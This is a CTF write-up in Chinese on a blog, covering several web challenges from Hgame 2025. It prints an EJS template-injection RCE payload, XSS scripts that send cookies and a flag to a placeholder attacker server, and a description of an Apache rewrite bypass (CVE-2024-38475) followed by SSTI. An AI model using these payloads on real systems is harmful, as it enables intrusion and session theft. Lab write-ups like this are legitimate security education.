id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hgame.25.2</title>
    <link href="/2025/10/12/Hgame-25-2/"/>
    <url>/2025/10/12/Hgame-25-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame-25-2"><a href="#Hgame-25-2" class="headerlink" title="Hgame.25.2"></a>Hgame.25.2</h1><h2 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a><strong>Level 24 Pacman</strong></h2><p>一道游戏题，禁止了F12打开控制器，用右键打开检查<img src="/2025/10/12/Hgame-25-2/image-20251014235553289.png">，效果是一样的</p><p>看了源码知道这里进行了js混淆,首先查找关键字“hgame”“aGdhbWU&#x3D;（hgame的base64）”</p><p>找不到，但运气好 直接看到了可疑文字<img src="/2025/10/12/Hgame-25-2/image-20251015000301856.png"></p><p><img src="/2025/10/12/Hgame-25-2/image-20251015000146059.png"></p><p>其实直接控制台也可以<img src="/2025/10/12/Hgame-25-2/image-20251015000334913.png"></p><p>重新排列就结束了</p><h2 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a><strong>Level 47 BandBomb</strong></h2><p>本题给出源码，贴出</p><details>  <summary>点击展开查看代码</summary><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/static&#x27;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-keyword">const</span> storage = multer.<span class="hljs-title function_">diskStorage</span>(&#123;<br>  <span class="hljs-attr">destination</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&#x27;uploads&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(uploadDir)) &#123;<br>      fs.<span class="hljs-title function_">mkdirSync</span>(uploadDir);<br>    &#125;<br>    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, uploadDir);<br>  &#125;,<br>  <span class="hljs-attr">filename</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, file.<span class="hljs-property">originalname</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>(&#123; <br>  <span class="hljs-attr">storage</span>: storage,<br>  <span class="hljs-attr">fileFilter</span>: <span class="hljs-function">(<span class="hljs-params">_, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">if</span> (!file.<span class="hljs-property">originalname</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cb</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;无效的文件名&#x27;</span>), <span class="hljs-literal">false</span>);<br>      &#125;<br>      <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-title function_">cb</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;文件处理错误&#x27;</span>), <span class="hljs-literal">false</span>);<br>    &#125;<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> uploadsDir = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>);<br>  <br>  <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(uploadsDir)) &#123;<br>    fs.<span class="hljs-title function_">mkdirSync</span>(uploadsDir);<br>  &#125;<br><br>  fs.<span class="hljs-title function_">readdir</span>(uploadsDir, <span class="hljs-function">(<span class="hljs-params">err, files</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mortis&#x27;</span>, &#123; <span class="hljs-attr">files</span>: [] &#125;);<br>    &#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mortis&#x27;</span>, &#123; <span class="hljs-attr">files</span>: files &#125;);<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/upload&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  upload.<span class="hljs-title function_">single</span>(<span class="hljs-string">&#x27;file&#x27;</span>)(req, res, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">file</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;没有选择文件&#x27;</span> &#125;);<br>    &#125;<br>    res.<span class="hljs-title function_">json</span>(&#123; <br>      <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;文件上传成功&#x27;</span>,<br>      <span class="hljs-attr">filename</span>: req.<span class="hljs-property">file</span>.<span class="hljs-property">filename</span> <br>    &#125;);<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/rename&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; oldName, newName &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">const</span> oldPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>, oldName);<br>  <span class="hljs-keyword">const</span> newPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>, newName);<br><br>  <span class="hljs-keyword">if</span> (!oldName || !newName) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27; &#x27;</span> &#125;);<br>  &#125;<br><br>  fs.<span class="hljs-title function_">rename</span>(oldPath, newPath, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27; &#x27;</span> + err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>    res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27; &#x27;</span> &#125;);<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器运行在 http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure></details> <p>审计一下代码 可以知道这是利用multer完成的文件上传功能</p><p>接受文件后 后端自动将其放入updates文件夹（不会更改文件名）</p><p>并且提供了一个rename接口 （通过json方式提交）</p><p>这里泄露了文件路径，但不知道有没有用</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014213117270.png"></p><p>经过对mortis.ejs模板的了解，思路就很清晰了，如果可以上传文件，随后通过重命名将mortis.ejs模板覆盖，模板就会执行我注入的内容</p><p>├── app.js </p><p>├── package.json </p><p>├── node_modules&#x2F; </p><p>├── views&#x2F;           &lt;– 视图文件（EJS 模板）的<strong>标准默认目录</strong> </p><p>│          └── mortis.ejs   &lt;– 你覆盖的模板文件 </p><p>└── uploads&#x2F;         &lt;– 文件上传的目标目录</p><p>​            └── your_file</p><p>后期我们可以ls看一下<img src="/2025/10/12/Hgame-25-2/image-20251014224531385.png"></p><p>后面时间开始测试攻击 注意，这里的type要改成json，</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014215320217.png"></p><p>访问static，发现能打开</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014215359811.png"></p><p>那既然能简单的实现功能，那思路就很清晰了，一个点是RCE代码的拼写，另一个就是了解路径，通过路径穿越覆盖模板</p><p>然后进行路径遍历覆盖<img src="/2025/10/12/Hgame-25-2/image-20251014224625991.png"></p><p>进行rce</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%= <span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-title function_">toString</span>() %&gt;<br>    or<br>&lt;%= process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) %&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/12/Hgame-25-2/image-20251014222213047.png"></p><p>我是三个成组发送请求，这样比较方便，最后查看&#x2F;路由即可</p><p>这里居然没放在文件夹中</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014222243970.png"></p><p>最后在env中找到 ，</p><p>可能是怕我们把flag给覆盖了导致解不出题？</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014222314127.png"></p><h2 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a><strong>Level 69 MysteryMessageBoard</strong></h2><p>本题也有一个源码包，是go语言，打开靶场是一个登录界面<img src="/2025/10/12/Hgame-25-2/image-20251014225635690.png"></p><p>这里源码第一段 至少能知道 有两个账号</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014225737915.png"></p><p>后面的代码没有提供密码的线索，那就先考虑爆破，发现这道题也是支持爆破的（一般都想爆破看看admin 我也试了，但想想应该也不可能）</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014230731375.png"></p><p>后面进入留言板，看起来像ssti，但代码没有提供任何解析模板的部分，但是像xss</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014230854337.png"></p><p>还有一个路由 &#x2F;admin 访问后<img src="/2025/10/12/Hgame-25-2/image-20251014232615999.png"></p><p>猜测有一种是xss获取admin的密钥后访问flag（因为还有一个flag接口）</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014232938007.png"></p><p>这里直接拼接commnets参数就确定了xss漏洞</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">当写入《img src=1 onerror=alert(1)》时，成功跳出弹窗 <br></code></pre></td></tr></table></figure><p>但源码中，httponly也是设置为false，允许了窃取<img src="/2025/10/12/Hgame-25-2/image-20251014233332586.png"></p><p>尝试外带</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">var</span> admin_cookie = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://ATTACKER_SERVER/cookie?cookie=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(admin_cookie));<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/12/Hgame-25-2/image-20251014233503668.png"></p><p>随后访问&#x2F;admin得到响应</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014233904830.png"></p><p>找到admin的session进行替换访问flag</p><p><img src="/2025/10/12/Hgame-25-2/image-20251014233933996.png"></p><p>后话 那其实有一把锁的方法 直接让admin去访问flag即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://ATTACKER_SERVER/log?f=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(f)))<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/12/Hgame-25-2/image-20251014234416346.png"></p><h2 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a><strong>Level 38475 角落</strong></h2><p>进入靶场</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015000708690.png"></p><p>这次是真像ssti</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015000725366.png"></p><p>但输入字符后没有任何回显，但有细节</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015000917647.png"></p><p>最下方的 Send successfully!! 在url中有明文 查看源码 再测试 也排除了xss的可能</p><p>没招了 直接扫盘<img src="/2025/10/12/Hgame-25-2/image-20251015002020735.png"><img src="/2025/10/12/Hgame-25-2/image-20251015002028260.png"></p><p>访问app&#x2F;conf得到线索</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015002322254.png"></p><p>看不懂 扔给ai 这是Apache HTTP 服务器的配置文件</p><ol><li>&#96;&#96;<strong>允许用户通过 URL 直接访问该目录。</strong> - <code>Options Indexes</code>: 允许在没有 <code>index.html</code> 等文件时，显示该目录下的文件列表，造成<strong>信息泄露漏洞</strong>。  - <code>Require all granted</code>: 允许所有请求访问。</li><li><strong>禁止用户通过 URL 直接访问 <code>app.py</code> 文件。</strong> - <code>Deny from all</code>: 明确拒绝所有外部 URL 请求 <code>/.../app.py</code>。 <strong>这是针对直接访问的唯一安全措施。</strong></li></ol><p>重点应该在第三块，应该是利用这个重写机制访问某个文件，这里的线索只指向原先静止外部访问的app.py</p><p>这里用到 Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！<a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig</a>  (CVE-2024-38475)</p><p>于是构造&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py%3f 再修改UA就可用❓绕过，通过本地直接访问app.py</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015131039918.png"></p><p><strong>直接访问</strong> <code>/usr/local/apache2/app/app.py</code> 时，Apache 会将 <code>/usr/local/apache2/app/app.py</code> 视为<strong>请求的 URL 路径</strong>。</p><p>当利用重写规则时，<strong>外部请求</strong>是 <code>/admin/...</code>：它绕过了针对 <code>/usr/local/...</code> 路径的直接访问限制，以及针对 <code>/app/</code> 的 <code>ProxyPass</code> 规则。</p><p>进入下一关<img src="/2025/10/12/Hgame-25-2/image-20251015132205224.png"></p><p>贴出源码:</p><details>  <summary>点击展开查看代码</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br><span class="hljs-keyword">if</span> os.path.exists(filename):<br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>message = f.read()<br>f.close()<br><span class="hljs-keyword">return</span> message<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br><span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>status = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(message) <br>f.close()<br><br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br><span class="hljs-keyword">return</span> render_template_string(show)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure></details><p>看了源码就确定了是ssti模板注入，第一个函数提供了装有写入信息的txt文件 通过重写功能查看</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015134237780.png"></p><p>然后源码中有很多f.open f.read f.close操作  但没有死锁等机制 那有没有可能条件竞争呢</p><p>测试同时发send和read的包 成功了</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015142211173.png"></p><p><img src="/2025/10/12/Hgame-25-2/image-20251015142329875.png"></p><p>后面就直接构造</p><p>​这次这条线是先subclasses里面选os_wrap，再用脚本拿到index 然后initglobals.keys()找到popen可用  直接rce</p><p><img src="/2025/10/12/Hgame-25-2/image-20251015151936977.png"></p><p><img src="/2025/10/12/Hgame-25-2/image-20251015151824607.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF_WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
